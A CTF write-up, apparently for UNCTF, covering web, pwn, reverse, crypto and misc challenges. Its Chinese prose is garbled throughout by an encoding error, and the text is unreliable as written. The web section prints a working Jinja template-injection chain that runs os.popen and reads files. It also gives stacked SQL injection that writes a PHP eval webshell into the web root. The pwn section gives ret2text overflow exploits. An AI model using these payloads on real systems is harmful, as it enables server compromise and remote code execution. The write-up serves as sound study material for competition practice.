fuzzä¸€æ³¢ï¼Œå‘ç°è¿‡æ»¤äº†[]ã€_ã€&quot;ã€&#39;ã€%ç­‰ï¼Œå°è¯•ç”¨requestå¤–éƒ¨å‚æ•°æ–¹å¼ï¼Œåˆ©ç”¨&lt;class &#39;click.utils.LazyFile&#39;&gt;ç±»å‘½ä»¤æ‰§è¡Œã€‚ åˆ—ç›®å½•ï¼š 1?guess=&#123;&#123;&#123;&#125;|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)&#125;&#125;&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;init=__init__&amp;g=__globals__&amp;mod=os&amp;func=popen&amp;cmd=ls&amp;re=read è¯»æ–‡ä»¶ï¼š 1?guess=&#123;&#123;&#123;&#125;|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)(request.args.file)|attr(request.args.re)()&#125;&#125;&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;file=flag.txt&amp;re=read â€‹ checkin-sql éå¸¸ç®€å•çš„sql 0.0 æç¤º1ï¼šflagä¸åœ¨æ•°æ®åº“ä¸­ã€‚ã€‚ å¼ºç½‘æ¯ 2019-éšä¾¿æ³¨åŸé¢˜é­”æ”¹ã€‚ 1&#39; or 1=1 #ï¼ŒæŸ¥çœ‹è¿”å›æ•°æ® 1&#39; order by 2 #ï¼ŒæŸ¥åˆ—æ•° 1&#39; union select 1,2 #ï¼Œå¤±è´¥ï¼Œè¯´æ˜æœ‰æ­£åˆ™è¿‡æ»¤ 1&#39;; show databases;#ï¼Œå †å æ³¨å…¥æŸ¥æ•°æ®åº“ 1&#39;; show tables;#ï¼Œå †å æ³¨å…¥æŸ¥è¡¨ 1&#39;; show columns from 0xDktb;#ï¼Œå †å æ³¨å…¥æŸ¥æ•°æ®åº“ ç”¨é¢„å¤„ç†è¯­å¥æŸ¥è¯¢ç»“æœï¼ˆselect * from `0xDktb` ï¼‰ï¼š 1&#39;; set@a=0x73656c656374202a2066726f6d20603078446b746260; prepare execsql from @a;execute execsql;#ï¼Œå¤±è´¥ï¼Œè¯´æ˜æœ‰å…³é”®å­—è¢«è¿‡æ»¤ï¼Œå°è¯•å‘ç°æ˜¯setå…³é”®å­— æ”¹ä¸ºï¼š 1&#39;; prepare execsql from 0x73656c656374202a2066726f6d20603078446b746260;execute execsql;#ï¼ŒæˆåŠŸæŸ¥è¯¢ï¼Œä½†ä¸æ˜¯flagï¼Œæ›´æ¢æŸ¥è¯¢å†…å®¹ï¼Œæ‰¾äº†æ•´ä¸ªæ•°æ®åº“éƒ½æœªå‘ç°flagå­—ç¬¦ä¸²ã€‚ çŒœæµ‹flagåœ¨æ–‡ä»¶ç³»ç»Ÿé‡Œï¼Œå°è¯•å†™æ–‡ä»¶ï¼ˆselect &#39;&lt;?php @eval($_POST[ccc]);?&gt;&#39; into outfile &#39;/var/www/html/shell.php&#39;ï¼‰ï¼š 1&#39;; prepare execsql from 0x73656c65637420273c3f70687020406576616c28245f504f53545b6363635d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f7368656c6c2e70687027;execute execsql;# ç”¨èšå‰‘è¯•è¿ï¼Œå‘ç°æˆåŠŸï¼Œåœ¨æ ¹ç›®å½•æ‹¿åˆ°flagã€‚ â€‹ PwnYLBNB å®ˆæŠ¤ä¸–ç•Œä¸Šæœ€å¥½çš„YLBnc 45.158.33.12 8000 å…ˆncï¼Œæç¤ºç”¨pwntoolï¼Œè¿è¡Œè„šæœ¬æ‹¿åˆ°flagã€‚ 123from pwn import *r = remote(&#x27;45.158.33.12&#x27;, 8000)r.interactive() â€‹ fanç®€å•ret2text 1234567from pwn import *r = remote(&#x27;node2.hackingfor.fun&#x27;,48548)system_addr=0x400735payload = &#x27;a&#x27;*(0x30+8) + p64(system_addr)r.recvuntil(&#x27;input your message\\n&#x27;)r.sendline(payload)r.interactive() â€‹ do_you_like_me?ç®€å•ret2text 1234567from pwn import *r = remote(&#x27;node2.hackingfor.fun&#x27;,46506)system_addr=0x4006CDpayload = &#x27;a&#x27;*(0x10+8) + p64(system_addr)r.recvuntil(&#x27;Give me your input : &#x27;)r.sendline(payload)r.interactive() â€‹ Reversere_checkin äºŒè¿›åˆ¶æ‰‹åšä¸å‡ºæ¥è¿™ä¸ªå°±è€ƒè™‘é€€å½¹å§ IDAæ‰“å¼€ï¼Œå®šä½åˆ°startå‡½æ•°ï¼Œå†ä¸æ–­è·Ÿè¿›åˆ°sub_4015DCå‘ç°flagã€‚ 1234567891011121314151617181920212223242526272829303132.text:00000000004015DC sub_4015DC proc near .text:00000000004015DC arg_0 = qword ptr 10h.text:00000000004015DC.text:00000000004015DC push rbp.text:00000000004015DD mov rbp, rsp.text:00000000004015E0 mov [rbp+arg_0], rcx.text:00000000004015E4 mov cs:Str2, &#x27;u&#x27;.text:00000000004015EB mov cs:byte_42F041, &#x27;n&#x27;.text:00000000004015F2 mov cs:byte_42F042, &#x27;c&#x27;.text:00000000004015F9 mov cs:byte_42F043, &#x27;t&#x27;.text:0000000000401600 mov cs:byte_42F044, &#x27;f&#x27;.text:0000000000401607 mov cs:byte_42F045, &#x27;&#123;&#x27;.text:000000000040160E mov cs:byte_42F046, &#x27;W&#x27;.text:0000000000401615 mov cs:byte_42F047, &#x27;e&#x27;.text:000000000040161C mov cs:byte_42F048, &#x27;l&#x27;.text:0000000000401623 mov cs:byte_42F049, &#x27;c&#x27;.text:000000000040162A mov cs:byte_42F04A, &#x27;o&#x27;.text:0000000000401631 mov cs:byte_42F04B, &#x27;m&#x27;.text:0000000000401638 mov cs:byte_42F04C, &#x27;e&#x27;.text:000000000040163F mov cs:byte_42F04D, &#x27;T&#x27;.text:0000000000401646 mov cs:byte_42F04E, &#x27;o&#x27;.text:000000000040164D mov cs:byte_42F04F, &#x27;U&#x27;.text:0000000000401654 mov cs:byte_42F050, &#x27;N&#x27;.text:000000000040165B mov cs:byte_42F051, &#x27;C&#x27;.text:0000000000401662 mov cs:byte_42F052, &#x27;T&#x27;.text:0000000000401669 mov cs:byte_42F053, &#x27;F&#x27;.text:0000000000401670 mov cs:byte_42F054, &#x27;&#125;&#x27;.text:0000000000401677 mov cs:byte_42F055, 0.text:000000000040167E nop.text:000000000040167F pop rbp.text:0000000000401680 retn.text:0000000000401680 sub_4015DC endp â€‹ åç¼–è¯‘ç”¨ pyinstxtractoråç¼–è¯‘å‡ºpycæ–‡ä»¶ï¼Œå†ç”¨uncompyle6åç¼–è¯‘pycå¯å¾—æºä»£ç ï¼š 12345str2 = &#x27;UMAQBvogWLDTWgX&quot;&quot;&quot;k&#x27;flag = &#x27;&#x27;for i in range(len(str2)): flag += chr(ord(str2[i]) + i)print(flag) è¿è¡Œå¾—flagã€‚ â€‹ babypy Babypy.Thatâ€™s really easy!!! ç”¨ pyinstxtractoråç¼–è¯‘å‡ºpycæ–‡ä»¶ï¼Œå†ç”¨uncompyle6åç¼–è¯‘pycå¯å¾—æºä»£ç ï¼š 1234567891011121314151617181920212223import os, libnum, binasciiflag = &#x27;unctf&#123;*******************&#125;&#x27;x = libnum.s2n(flag)def gen(x): y = abs(x) while 1: if y &gt; 0: yield y % 2 y = y &gt;&gt; 1 else: if x == 0: yield 0l = [i for i in gen(x)]l.reverse()f = &#x27;%d&#x27; * len(l) % tuple(l)a = binascii.b2a_hex(f.encode())b = int(a, 16)c = hex(b)[2:]print(c)os.system(&#x27;pause&#x27;) ä»£ç é€»è¾‘ä¸ºå­—ç¬¦â†’10è¿›åˆ¶â†’2è¿›åˆ¶â†’å­—ç¬¦16è¿›åˆ¶ï¼Œtxtæ–‡ä»¶16è¿›åˆ¶æŒ‰é€»è¾‘é€†æ¨å¾—åˆ°flagã€‚ â€‹ CTFilter å‡å¦‚ä½ æ˜¯æåï¼Œä½ çš„å¥½å‹å­¦ä¹ å§”å‘˜æ— æ„ä¹‹é—´çœ‹åˆ°äº†ä¸€ä¸²flagï¼è¿™ä¸²flagææœ‰å¯èƒ½æ˜¯è§£å¼€è°œé¢˜çš„å…³é”®ã€‚ä»–ç«‹åˆ»åœ¨ä¸€å°è£…æœ‰Windows10 1903 x64æ“ä½œç³»ç»Ÿçš„è™šæ‹Ÿæœºä¸­ä½¿ç”¨è®°äº‹æœ¬å†™ä¸‹äº†è¿™ä¸²flagå¹¶ä¿å­˜ã€‚ç„¶è€Œï¼Œä»¤ä»–æ²¡æƒ³åˆ°çš„æ˜¯ï¼Œè¿™ä¸ªç³»ç»Ÿå´å¦æœ‰ç„æœºï¼ä»»ä½•äººéƒ½æ— æ³•åœ¨è¿™ä¸ªç³»ç»Ÿä¸­å†™ä¸‹æ­£ç¡®çš„flagï¼Ÿè¯·ä½ ä»¥å¥½å‹çš„èº«ä»½å¯¹ä»–ä¼¸å‡ºæ´æ‰‹ï¼Œå¸®åŠ©å­¦ä¹ å§”å‘˜æ‰¾åˆ°çœŸæ­£çš„flagã€‚ å­¦ä¹ å§”å‘˜ï¼šé‚£ä½ èƒ½å¸®å¸®æˆ‘å—ï¼Ÿæåï¼šç§è°ä¸èµ·å‘¢ï¼Ÿ å‹ç¼©åŒ…é‡Œæœ‰CTFilter.sysã€Hint.exeã€Unknown_dataã€Story.txtå››ä¸ªæ–‡ä»¶ï¼ŒIDAåˆ†æå‰ä¸¤ä¸ªï¼ŒCTFilter.sysæŸ¥çœ‹æ²¡ä»€ä¹ˆç»“æœï¼ŒHint.exeä¸­å‘ç°ä¸€ä¸ªflagå­—ç¬¦ä¸²flag&#123;Oh!You_found_me~&#125;ï¼Œç»“åˆé¢˜å¹²æè¿°è¿™ä¸²flagææœ‰å¯èƒ½æ˜¯è§£å¼€è°œé¢˜çš„å…³é”®ï¼Œå°è¯•å°†flagå­—ç¬¦ä¸²ä½œä¸ºkeyä¸å¯†æ–‡Unknown_dataå¼‚æˆ–ï¼Œå‘ç°å±…ç„¶æˆåŠŸå¾—åˆ°flagã€‚ â€‹ Cryptoeasy_rsaç»™ $a,b,e$ï¼Œæ˜“æ¨å‡º $p$ å’Œ $q$ï¼Œå†æŒ‰æ­£å¸¸RSAè§£æ³•è§£å³å¯ã€‚ 123456789101112import gmpy2a = 320398687477638913975700270017132483556404036982302018853617987417039612400517057680951629863477438570118640104253432645524830693378758322853028869260935243017328300431595830632269573784699659244044435107219440036761727692796855905230231825712343296737928172132556195116760954509270255049816362648350162111168b = 9554090001619033187321857749048244231377711861081522054479773151962371959336936136696051589639469653074758469644089407114039221055688732553830385923962675507737607608026140516898146670548916033772462331195442816239006651495200436855982426532874304542570230333184081122225359441162386921519665128773491795370p = (a+b)/2q = (a-b)/2n = p * qe = 65537phi = (p-1)*(q-1)d = gmpy2.invert(e,phi)c = 22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:])) â€‹ éå±±å¤§æ³•å®˜å¼€åº­ä¹‹ç¼ºçš„è¥å…»è¿™ä¸€å—æ€ä¹ˆè¡¥ æŸæ—¥ï¼Œéå±±å¤§æ³•å®˜åœ¨ç‚¹å¤–å–æ—¶ç‚¹äº†2ä¸ªéŸ­èœç›’å­ï¼Œå•†å®¶åªé€äº†1ä¸ªï¼Œå¤§æ³•å®˜ç»™äº†è¯¥å•†å®¶ä¸€ä¸ªå·®è¯„æ¬¡æ—¥ï¼Œè¯¥å¤§æ³•å®˜åˆåœ¨è¯¥å•†å®¶ç‚¹äº†1ä¸ªéŸ­èœç›’å­ï¼Œå¸Œæœ›å•†å®¶èƒ½è¡¥ä¸Šä¸Šæ¬¡çš„éŸ­èœç›’å­ï¼Œè€Œå•†å®¶åˆåªå‘äº†ä¸€ä¸ªéŸ­èœç›’å­è¿™åå¤§æ³•å®˜ä¸€å¤©æ­£å¸¸è¦åƒ2ä¸ªéŸ­èœç›’å­ï¼Œè€Œè¯¥å•†å®¶æ¯å¤©åªç»™ä»–1ä¸ªéŸ­èœç›’å­ï¼Œè¯·é—®è¯¥åå¤§æ³•å®˜ç¼ºçš„è¥å…»è¿™ä¸€å—æ€ä¹ˆè¡¥ottttootoootooooottoootooottotootttootooottotttooootttototoottooootoooottotoottottooooooooottotoottoflagæ ¼å¼ï¼šunctf{} å°è¯•äºŒè¿›åˆ¶è½¬å­—ç¬¦åŠæ‘©æ–¯å¯†ç å‡ä¸æˆåŠŸï¼Œæœ€åæ‰æƒ³åˆ°åŸ¹æ ¹å¯†ç ï¼Œåˆ†åˆ«æŠŠoå’Œtæ›¿æ¢ä¸ºAå’ŒBï¼Œåœ¨çº¿è§£å¯†å¾—flagã€‚ â€‹ ç®€å•çš„RSA ä½ ä»¬éƒ½ä¸ä¼šç™¾åº¦çš„å— åªç»™å‡º $e,n,c$ï¼Œä¸” $e$ å¾ˆå¤§ï¼Œç®€å•çš„RSA Wieneræ”»å‡»ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#sagedef rational_to_contfrac(x,y): # Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] a = x // y pquotients = [a] while a * y != x: x, y = y, x - a * y a = x // y pquotients.append(a) return pquotientsdef convergents_from_contfrac(frac): # computes the list of convergents using the list of partial quotients convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0 : i])) return convsdef contfrac_to_rational (frac): # Converts a finite continued fraction [a0, ..., an] to an x/y rational. if len(frac) == 0: return (0,1) num = frac[-1] denom = 1 for _ in range(-2, -len(frac) - 1, -1): num, denom = frac[_] * num + denom, num return (num, denom)e= 18437613570247445737704630776150775735509244525633303532921813122997549954741828855898842356900537746647414676272022397989161180996467240795661928117273837666615415153571959258847829528131519423486261757569454011940318849589730152031528323576997801788206457548531802663834418381061551227544937412734776581781n= 147282573611984580384965727976839351356009465616053475428039851794553880833177877211323318130843267847303264730088424552657129314295117614222630326581943132950689147833674506592824134135054877394753008169629583742916853056999371985307138775298080986801742942833212727949277517691311315098722536282119888605701c= 140896698267670480175739817539898638657099087197096836734243016824204113452987617610944986742919793506024892638851339015015706164412994514598564989374037762836439262224649359411190187875207060663509777017529293145434535056275850555331099130633232844054767057175076598741233988533181035871238444008366306956934 def egcd(a, b): if a == 0: return (b, 0, 1) g, x, y = egcd(b % a, a) return (g, y - (b // a) * x, x)def mod_inv(a, m): g, x, _ = egcd(a, m) return (x + m) % mdef isqrt(n): x = n y = (x + 1) // 2 while y &lt; x: x = y y = (x + n // x) // 2 return x def crack_rsa(e, n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 # check if x*x - s*x + n = 0 has integer roots D = s * s - 4 * n if D &gt;= 0: sq = isqrt(D) if sq * sq == D and (s + sq) % 2 == 0: return dd = crack_rsa(e, n)m = hex(pow(c, d, n))[2:]print(bytes.fromhex(m)) â€‹ wing ä½ è¿‡officeäºŒçº§äº†å— æç¤ºofficeï¼ŒçŒœæµ‹ä¸ºwordä¸­æŸç§å­—ä½“ï¼Œæ‰“å¼€wordè¾“å…¥å­—æ¯+æ•°å­—ï¼Œå†åˆ‡æ¢å„å­—ä½“æ ¸å¯¹ï¼Œå‘ç°ä¸ºWingdings 2å­—ä½“ï¼Œå¯¹ç…§æ›¿æ¢å¾—flagã€‚ â€‹ signin Really baby problem about block cipherflag æ ¼å¼ï¼š flag{} AES-ECBæ¨¡å¼ä¸¤æ¬¡åŠ å¯†ï¼Œä¸”å¯†é’¥å·²çŸ¥ä½è¾ƒå¤šï¼Œå¯é‡‡ç”¨ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰ã€‚ çˆ†ç ´è„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829from Crypto.Cipher import AESfrom binascii import hexlify,unhexlifyfrom string import printablealph = printablem = &#x27;&#x27;c = &#x27;&#x27;flag_c = &#x27;&#x27;middle = dict();for x in alph: for y in alph: for z in alph: key1 = &#x27;%s%s%s%s&#x27; % (&#x27;0&#x27; * 13, x, y, z) cipher = AES.new(key1) middle.update(&#123;cipher.encrypt(m): key1&#125;)print &quot;\\nTable built...\\n&quot;;for x in alph: for y in alph: for z in alph: key2 = &#x27;%s%s%s%s&#x27; % (x, y, z, &#x27;0&#x27; * 13) cipher = AES.new(key2) d = cipher.decrypt(c) if d in middle: print &quot;\\nKeys found: %s; %s\\nFlag:&quot; % (middle[d].encode(&#x27;hex&#x27;), key2.encode(&#x27;hex&#x27;)) cipher1 = AES.new(middle[d]) print cipher1.decrypt(cipher.decrypt(flag_c)) â€‹ å¿«ä¹æ•°å­¦_0x00 åˆšæ‰æˆ‘é—®æ‰å…‹åˆ©ï¼Œæ‰æ€»å‘ç”Ÿç”šä¹ˆäº‹äº†ã€‚æ‰æ€»è¯´æ€ä¹ˆå›äº‹ã€‚æˆ‘ç»™æ‰æ€»å‘äº†å‡ å¼ æˆªå›¾ã€‚æ‰æ€»ä¸€çœ‹ï¼Œå™¢ï¼ŒåŸæ¥æ˜¯æ˜¨å¤©ï¼Œå‡ ä¸ªå¤§å­¦ç”Ÿï¼ŒäºŒåå¤šå²ï¼Œä»–ä»¬è¯´ï¼Œå“~ã€‚æœ‰ä¸€ä¸ªè¯´ï¼Œæˆ‘åœ¨ UNCTF æ‰“æ¯”èµ›ï¼Œå¤´éƒ½åšç–¼äº†ï¼Œæ‰æ€»ï¼Œä½ èƒ½ä¸èƒ½æ•™æ•™æˆ‘æ€ä¹ˆåšé¢˜ï¼Œå“ï¼Œå¸®æˆ‘åˆ†æ•°å¼„é«˜ä¸€ç‚¹ã€‚æ‰æ€»è¯´ï¼Œå¯ä»¥ï¼Œä½ åœ¨ UNCTF æ­»åšé¢˜ï¼Œä¸å¥½ç”¨ã€‚ä»–ä¸æœæ°”ã€‚æ‰æ€»è¯´ï¼Œæˆ‘è¯´å°æœ‹å‹ï¼Œä½ å¤šé•¿ä¸¤ä¸ªè„‘å­æ¥åšæˆ‘è¿™æ–°é¢˜ã€‚ä»–åšä¸åŠ¨ï¼Œä»–è¯´ä½ è¿™ä¸ªæ²¡ç”¨ã€‚æ‰æ€»è¯´ï¼Œæˆ‘è¿™ä¸ªæœ‰ç”¨ï¼Œä»–æ˜¯æ•°å­¦ï¼Œæ•°å­¦å¯¹è®¡ç®—æœºåŸºç¡€å¾ˆé‡è¦ï¼ŒäºŒç™¾å¤šä¸ªäººåšä¸å‡ºæˆ‘è¿™é¢˜ã€‚ä»–éè¦å’Œæˆ‘è¯•è¯•ã€‚æ‰æ€»è¯´ï¼Œå¯ä»¥ã€‚æ‰æ€»ä¸€è¯´ä»–å•ªç«™èµ·æ¥äº†ï¼Œå¾ˆå¿«å•Šï¼Œç„¶åä¸Šæ¥ä¸€ä¸ªå·¦æ­£è¹¬ï¼Œä¸€ä¸ªå³é­è…¿ï¼Œä¸€ä¸ªå·¦åˆºæ‹³ã€‚æ‰æ€»å…¨éƒ¨é˜²å‡ºå»äº†å•Šï¼Œé˜²å‡ºå»ä»¥åï¼Œè‡ªç„¶æ˜¯ä¼ ç»ŸåŠŸå¤«ä»¥ç‚¹åˆ°ä¸ºæ­¢ï¼Œå³æ‰‹æŠŠæ•°å­¦é¢˜æ‘åœ¨ä»–é¼»å­ä¸Šï¼Œæ²¡æ‰“ä»–ï¼Œæ‰æ€»ç¬‘äº†ä¸€ä¸‹ï¼Œå‡†å¤‡æ”¶æ‹³ã€‚åé¢æˆ‘æš‚æ—¶ç¼–ä¸ä¸‹å»äº†ï¼Œä½ ä»¬æ¥è·Ÿæ‰æ€»æ‰“å§ã€‚æ•°å­¦é¢˜ï¼Œå¯èƒ½å­˜åœ¨å¼‚è®®çš„ï¼Œç¾¤é‡Œç§èŠ Hanser çš„è€å…¬ã€‚ é“¾æ¥: https://pan.baidu.com/s/1nB8j4TN3HFe_SXvrwzyE2g å¯†ç : ca04 çº¯é«˜æ•°å›å¿†å½•ï¼Œå¤ä¹ äº†ä¸€æŠŠï¼Œé‡‡ç”¨wolframalphaè¾…åŠ©è®¡ç®—ã€‚ ç¬¬ä¸€ä¸ªï¼Œ$\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}+\\cdots+\\sqrt[n]{2020}}{2020})^n$ï¼š è®¡ç®—åˆ°2020å¼€næ¬¡æ–¹çš„æ±‚å’Œä¸å¥½è¡¨ç¤ºï¼Œå¯ä»¥ç”¨wolframalphaè§‚å¯Ÿè§„å¾‹ï¼š $\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}}{2020})^n=\\sqrt{2}$ $\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}+\\sqrt[n]{3}}{2020})^n=\\sqrt[3]{6}=\\sqrt[3]{2\\cdot3}$ $\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}+\\sqrt[n]{3}+\\sqrt[n]{4}}{2020})^n=\\sqrt[4]{24}=\\sqrt[4]{2\\cdot3\\cdot4}$ $\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}+\\sqrt[n]{3}+\\sqrt[n]{4}+\\sqrt[n]{5}}{2020})^n=\\sqrt[5]{120}=\\sqrt[5]{2\\cdot3\\cdot4\\cdot5}$ ä»¥æ­¤ç±»æ¨ï¼Œ$\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}+\\cdots+\\sqrt[n]{2020}}{2020})^n=\\sqrt[2020]{2020!}$ ç¬¬äºŒä¸ªï¼Œ$\\lim \\limits_{x \\to +\\infty} \\cfrac{\\int_{0}^{x}\\text{d}u\\int_{0}^{u}[u^2-3\\sin(u-t)^2] \\text{d}t }{x^8}$ï¼š wolframalphaç¼–å†™ï¼š limit (integrate (integrate (u^2-3sin(u-t)^2),t=0 to u),u=0 to x)/(x^8) as x-&gt;+âˆ è®¡ç®—å¾—å‡ºï¼š$\\lim \\limits_{x \\to +\\infty} \\cfrac{\\int_{0}^{x}\\text{d}u\\int_{0}^{u}[u^2-3\\sin(u-t)^2] \\text{d}t }{x^8}=\\cfrac{1}{112}$ ç¬¬ä¸‰ä¸ªï¼Œè®¾ $\\Omega:x^2+y^2 \\leq 3z,1 \\leq z \\leq 4$ï¼Œæ±‚ $\\displaystyle\\iiint_\\Omega \\cfrac{1}{\\sqrt{x^2+y^2+z}}\\text{d}v$ï¼š è½¬æ¢åˆ°æåæ ‡æ±‚è§£ï¼Œè®¾ $x=r\\sin{\\theta},y=r\\cos{\\theta}$ï¼š wolframalphaç¼–å†™ï¼š (integrate dÎ¸,Î¸=0 to 2*pi)(integrate r/sqrt(r^2+z) dr, r=0 to sqrt(3z)) integrate 2*pi*sqrt(z) dz, z=1 to 4 è®¡ç®—å¾—å‡ºï¼š $\\displaystyle\\iiint_\\Omega \\cfrac{1}{\\sqrt{x^2+y^2+z}}\\text{d}v=\\int_{1}^{4}\\text{d}z\\int_{0}^{2\\pi}\\text{d}\\theta \\int_{0}^{\\sqrt{3z}}\\cfrac{r}{r^2+z}\\text{d}r=\\int_{1}^{4}2\\pi\\sqrt{z}\\text{d}z=\\cfrac{28\\pi}{3}$ æœ€åï¼Œåˆå¹¶ä¸º\\sqrt[2020]&#123;2020!&#125;-\\frac&#123;1&#125;&#123;112&#125;-\\frac&#123;28\\pi&#125;&#123;3&#125;ï¼Œmd5å€¼ä¸ºflagã€‚ â€‹ Miscbaba_is_you äº†è§£ä¸€ä¸‹pngæ–‡ä»¶æ ¼å¼ 16è¿›åˆ¶æŸ¥çœ‹ï¼Œæ–‡ä»¶å°¾æœ‰ä¸€ä¸²Bç«™ç½‘å€ï¼Œè®¿é—®ï¼Œåœ¨è¯„è®ºåŒºå‘ç°flagã€‚ â€‹ çˆ·çš„å†é™©è®° RPGå°æ¸¸æˆçˆ·æŠŠflagå¼„ä¸¢äº†, ä½ å¯ä»¥å¸®ä»–æ‰¾å›æ¥å— RPGå°æ¸¸æˆï¼Œå¯åŠ¨ç©è€ã€‚ å±‹é‡Œå±‹å¤–åˆ°å¤„å¯»æ‰¾çº¿ç´¢ï¼Œå‘ç°ä¸¤ä¸ªç®±å­ï¼Œåˆ†éƒ¨ç”¨base64è§£ç å‡ºå¯†ç 66668888å’Œæ‘©æ–¯å¯†ç è§£ç å‡ºå¯†ç 23332333æ‰“å¼€ç®±å­æ‹¿å¥–åŠ±ï¼Œä¾æ¬¡å‹‰å¼ºæ‰“è¿‡å±‹å¤–ä¸»åœºæ™¯å·¦è¾¹å’Œä¸‹è¾¹ä¸¤ä¸ªåœºæ™¯çš„å°bossï¼Œå±‹å¤–ä¸»åœºæ™¯å³ä¸‹æ–¹å•†äººå¤„å¯ä»¥è´­ä¹°hint1å’Œhint2ï¼Œhint2æç¤ºæŸ¥çœ‹æ¸¸æˆå­˜æ¡£ã€‚ æƒ³åˆ°ä¿®æ”¹å­˜æ¡£æ–‡ä»¶çš„æ–¹å¼ï¼Œæ›´æ”¹é‡‘é’±ä»¥è´­ä¹°hint3ã€‚ä½¿ç”¨RPGå­˜æ¡£åœ¨çº¿ä¿®æ”¹å™¨ä¿®æ”¹rpgsaveæ–‡ä»¶ä¸­çš„é‡‘é’±å±æ€§å€¼åˆ°æœ€å¤§å€¼ï¼Œå†å›åˆ°æ¸¸æˆåŠ è½½å­˜æ¡£ï¼Œè´­ä¹°hint3å³ä¸ºflagã€‚ â€‹ é˜´é˜³äººç¼–ç å‘ç°å«å°±è¿™.ã€å°±è¿™Â¿ã€ä¸ä¼šå§!ä¸‰ç§å­—ç¬¦ä¸²ï¼Œéœ€è¦ä¸€ç‚¹è„‘æ´ï¼Œè”æƒ³åˆ°Ookç¼–ç ï¼Œåœ¨çº¿è§£å¯†å¾—flagã€‚ â€‹ èº²çŒ«çŒ« æˆ‘èº²å¥½äº†ï¼Œä½ æ¥æ‰¾æˆ‘ ç›´æ¥æ‰“å¼€æŠ¥é”™ï¼Œå³é”®å‹ç¼©åŒ…æ‰“å¼€ï¼Œåœ¨sharedStrings.xmlå‘ç°base64ç¼–ç å­—ç¬¦ä¸²ï¼Œbase64+urlè§£ç å¾—flagã€‚ â€‹ YLBâ€™s CAPTCHA - ç­¾åˆ°é¢˜ YLBåŒæ¬¾éªŒè¯ç  ç¡¬çœ‹åˆ°çœ¼ç›ç–¼å°±èƒ½è¿‡äº†ï¼Œå¯ä»¥è€ƒè™‘ä¿®æ”¹cssé…è‰²æ–¹æ¡ˆé™ä½éš¾åº¦ã€‚ â€‹ æ’•åçš„äºŒç»´ç  RPGå°æ¸¸æˆçˆ·æŠŠflagå¼„ä¸¢äº†, ä½ å¯ä»¥å¸®ä»–æ‰¾å›æ¥å— éƒ¨åˆ†é®ç›–çš„äºŒç»´ç ï¼Œç›´æ¥ç”¨QR Rearchè¯†åˆ«å‡ºflagã€‚ â€‹ ç½‘ç»œæ·±å¤„1 å¥½å­©å­ä¸è¦ä¸Šæ´‹è‘±é¸­ ä¸‰ä¸ªæ–‡ä»¶ï¼Œtxtæœ‰ä¸€ä¸²æ•°å­—ï¼ŒzipåŒ…åŠ å¯†ï¼Œ Audacityåˆ†æwavæ–‡ä»¶ï¼Œç»“åˆæ–‡ä»¶åâ€œæ‹¨å·éŸ³â€ï¼Œç”¨DTMFæ‹¨å·éŸ³è¯†åˆ«è„šæœ¬è¯†åˆ«å‡ºwavçš„æ‰‹æœºå·ç ï¼Œè§£å‹å¾—ä¸€ä¸ªwavæ–‡ä»¶å’Œtxtæ–‡ä»¶ï¼Œç»§ç»­Audacityåˆ†æwavæ–‡ä»¶ï¼Œåˆ‡æ¢åˆ°é¢‘è°±å›¾å‘ç°å…³é”®å­—æˆ‘æ˜¯tupperï¼Œ äº†è§£åˆ°Tupperä¸ºè‡ªæˆ‘æŒ‡æ¶‰å…¬å¼ï¼Œæ‰¾åˆ°ä¸€ä¸ªåœ¨çº¿è¿˜åŸå›¾åƒç½‘ç«™è¿˜åŸå¾—flagã€‚ â€‹ mouse_click flagæ ¼å¼ä¸ºunctf{*}ï¼Œ**ä¸­çš„å­—æ¯ç»Ÿä¸€ä¸ºå¤§å†™ ç®€å•é¼ æ ‡æµé‡å–è¯ã€‚ æå–usbæ•°æ®ä¿¡æ¯ï¼š tshark -r mouse.pcapng -T fields -e usb.capdata &gt; usbdata.txt æå–åæ ‡å€¼è„šæœ¬ï¼š 12345678910111213141516171819202122nums = []keys = open(&#x27;usbdata.txt&#x27;,&#x27;r&#x27;)result = open(&#x27;result.txt&#x27;,&#x27;w&#x27;)posx = 0posy = 0for line in keys: line = line.strip() if line == &#x27;&#x27; :#å¿½ç•¥ç©ºè¡Œ continue x = int(line[6:8],16) y = int(line[9:11],16) if x &gt; 127 : x -= 256 if y &gt;127 : y -= 256 posx += x posy += y btn_flag = int(line[3:5],16) if btn_flag == 1 : result.write(str(posx)+&#x27; &#x27;+str(posy)+&#x27;\\n&#x27;)keys.close()result.close() è¿è¡Œï¼špython analyse.py æ§åˆ¶å°ç”»å›¾ï¼šgnuplot.exe -e &quot;plot &#39;result.txt&#39;&quot; -p â€‹ è¢«åˆ é™¤çš„flag flagè¢«åˆ é™¤äº†ï¼Œä½ èƒ½æ¢å¤å®ƒå— 16è¿›åˆ¶æŸ¥çœ‹ï¼Œæœç´¢unctfå¾—flagã€‚ â€‹ ä½ èƒ½ç 